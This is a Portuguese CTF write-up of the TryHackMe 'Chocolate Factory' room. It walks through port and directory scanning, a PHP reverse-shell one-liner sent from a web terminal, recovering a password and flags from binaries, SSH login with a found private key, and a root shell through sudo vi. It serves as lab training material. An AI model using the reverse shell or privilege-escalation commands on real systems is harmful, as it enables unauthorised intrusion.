> [!WARNING]
> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).

# [Chocolate Factory](https://tryhackme.com/room/chocolatefactory)

<a href="https://tryhackme.com/room/chocolatefactory"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>

> A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/chocolatefactory), feito por [0x9747](https://tryhackme.com/p/0x9747), [saharshtapi](https://tryhackme.com/p/saharshtapi) e [AndyInfoSec](https://tryhackme.com/p/AndyInfoSec).

Dificuldade: `Fácil`

Resolvido em: `2026/04/20`

# Conteúdos

- [Chocolate Factory](#chocolate-factory)
- [Conteúdos](#conteúdos)
- [Writeup](#writeup)
   * [Sumário](#sumário)
   * [Reconhecimento](#reconhecimento)
   * [Exploração](#exploração)
   * [Escalação de Privilégios](#escalação-de-privilégios)
   * [Notas finais](#notas-finais)

# Writeup

## Sumário

Usando informações escondidas em binários, é possível invadir a fábrica de chocolate e obter suas chaves.

## Reconhecimento

Antes de começar o reconhecimento e após iniciar a máquina, eu adicionei o endereço `cf.net` ao arquivo `/ect/hosts` para facilitar o acesso do endereço da máquina. Para verificar se tudo funcionou:

```bash
$ ping -c 3 cf.net
PING cf.net (<MACHINE_IP>) 56(84) bytes of data.
64 bytes from cf.net (<MACHINE_IP>): icmp_seq=1 ttl=62 time=224 ms
64 bytes from cf.net (<MACHINE_IP>): icmp_seq=2 ttl=62 time=660 ms
64 bytes from cf.net (<MACHINE_IP>): icmp_seq=3 ttl=62 time=375 ms

--- cf.net ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 223.630/419.378/659.769/180.829 ms
```

Com isso, prossegui aos procedimentos padrões. Isto é, já que possuo apenas um endereço, a primeira coisa a se fazer é verificar portas abertas usando `nmap`:[^nmap]

```bash
$ nmap -T4 cf.net
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-20 12:41 UTC
Nmap scan report for cf.net (<MACHINE_IP>))
Host is up (0.21s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map

Nmap done: 1 IP address (1 host up) scanned in 3.48 seconds
```

Opa! Diversas portas abertas... Decidi começar simples, checando o `http`.

<figure><img src="./assets/squirrel.png" title="index.html"></figure>

Uma página de login, com usuário e senha. Bem, decidi usar o `gobuster`[^gobuster] com uma das wordlists padrões do kali[^wl-dirl23med] para verificar se existia outras páginas relevantes:

```bash
$ gobuster dir -u cf.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1466]
/home.php             (Status: 200) [Size: 569]
/validate.php         (Status: 200) [Size: 93]
```

Encontrei `/index.html`, a página de login, `/home.php` e `/validate.php`. Enquanto `/validate.php` é apenas o script que roda ao submeter o formulário em `/index.html`, `/home.php` parecia-me muito mais promissor:

<figure><img src="./assets/terminal.png" title="home.php"></figure>

Um terminal! De imediato já comecei a bisbilhotar com alguns comandos...

```bash
$ whoami
www-data

$ ls
home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php
```

Quando tentei usar `cd ..` descobri que o terminal entra em timeout se o comando não resulta em um output. Tive de reiniciar a máquina por completo para restaurar o sistema! Mas realizar algo como `cd .. ; echo "a"` garante que exista um output.

Dito isso, o terminal se provou extremamente restritivo, então decidi montar um revshell[^rv] aqui.

## Exploração

Construir um revshell[^rv] foi um processo de tentativa e erro. Tentei vários modelos disponíveis em [revshells.com](https://www.revshells.com/) para `bash` mas não funcionaram. A alternativa restante era, então, usar `php`, considerando que o servidor possuia códigos de `php` (`/validate.php`).

Então, com o `netcat`[^nc] ouvindo em minha máquina:

```bash
$ nc -lvnp 1234
```

Enviei o comando para o servidor:

```bash
$ php -r '$sock=fsockopen("<MY_MACHINE>",1234);exec("sh <&3 >&3 2>&3");'
```

Bingo! Revshell ativado. Agora, com mais liberdade de controle, decidi olhar os arquivos mais profundamente. Notavelmente, o executável `key_rev_key` possuia algo. Separando as strings do binário, obtive:

```bash
$ strings validate.php
...
AUATL
[]A\A]A^A_
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'<FLAG_1>'
 Keep its safe
Bad name!
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
...
```

Com isso, completei a primeira tarefa.
- Q: Enter the key you found! A: b'<FLAG_1>'

Ainda nesse diretório, pude fazer o mesmo com `validate.php` e obter outra bandeira:

```bash
$ strings validate.php
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="<FLAG_2>"){
                echo "<script>window.location='home.php'</script>";
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
```

- Q: What is Charlie's password? A: <FLAG_2>

Ótimo! Com isso, descobri as credenciais da página de login! Infelizmente, como é possível de ver no código, as credenciais apenas me levariam de volta para `/home.php`. Então, voltei à exploração.

```bash
$ pwd
/home/charlie
$ ls
teleport
teleport.pub
user.txt
```

Eu me animei muito e acabei ignorando `user.txt` ao ver dois arquivos de chave. `teleport` é a chave privada e `teleport.pub` a chave pública, o que significa que elas provavelmente davam acesso à porta `ssh`!

```bash
$ cat teleport
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----

$ cat teleport.pub
ssh-rsa ... charlie@chocolate-factory
```

Com os arquivos recriados localmente, eu uso outro terminal para fazer o login no `ssh`:

```bash
$ ssh -i teleport charlie@cf.net

charlie@ip-<MACHINE_IP>:/$ whoami
charlie
```

- C: change user to charlie

Ótimo! Com acesso direto à máquina, eu finalmente abro o arquivo `user.txt`:

```bash
charlie@ip-<MACHINE_IP>:/home/charlie$ cat user.txt
<FLAG_USER>
```

- Q: Enter the user flag. A: <FLAG_USER>

## Escalação de Privilégios

Para realizar a escalação de privilégios, sempre gosto de começar com `sudo -l`:

```bash
charlie@ip-<MACHINE_IP>:/$ sudo -l
Matching Defaults entries for charlie on ip-<MACHINE_IP>:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-<MACHINE_IP>:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Já que `/usr/bin/vi` está com privilégios sem senha, basta usar um dos diversos disponíveis comandos em [GTFObins](https://gtfobins.org/) para remover as restrições:

```bash
charlie@ip-<MACHINE_IP>:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
# whoami
root
```

Com isso basta garatir a última bandeira...

```bash
# pwd
/root
# ls
root.py  snap
# cat root.py
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

E tem uma cifra por cima da última flag. Como a máquina não tinha python instalado, decidi usar [CyberChef](https://gchq.github.io/CyberChef/) para decifrar:

<figure><img src="./assets/flag3.png" title="CyberChef"></figure>

Basta definir a cifra como Fernet, usar a chave encontrada no início da máquina e o texto cifrado presente em `root.py`.

- Q: Enter the root flag A: <FLAG_ROOT>


## Notas finais

Na página da máquina existe um tiquete dourado com nome `01869e0b2238d8307020d2c4503cec51.jpg`, assemelhando a um hash MD4 ou MD5.

<figure><img src="./assets/01869e0b2238d8307020d2c4503cec51.jpg" title="Golden ticket"></figure>

Durante a exploração, eu tentei entrar na porta `ftp` e encontrei apenas uma imagem:

<figure><img src="./assets/gum_room.jpg" title="Gum room"></figure>

Apesar de não terem sido utilizados, esses arquivos e as diversas portas abertas leva-me a acreditar que existe outra solução para essa máquina.


[^nmap]: https://github.com/nmap/nmap
[^gobuster]: https://github.com/OJ/gobuster
[^wl-dirl23med]: https://gitlab.com/kalilinux/packages/dirbuster/-/blob/37f2e9bb1c50bee238aa50d795cf853bb28b2997/directory-list-2.3-medium.txt
[^nc]: https://nc110.sourceforge.io/
[^rv]: https://en.wikipedia.org/wiki/Shell_shoveling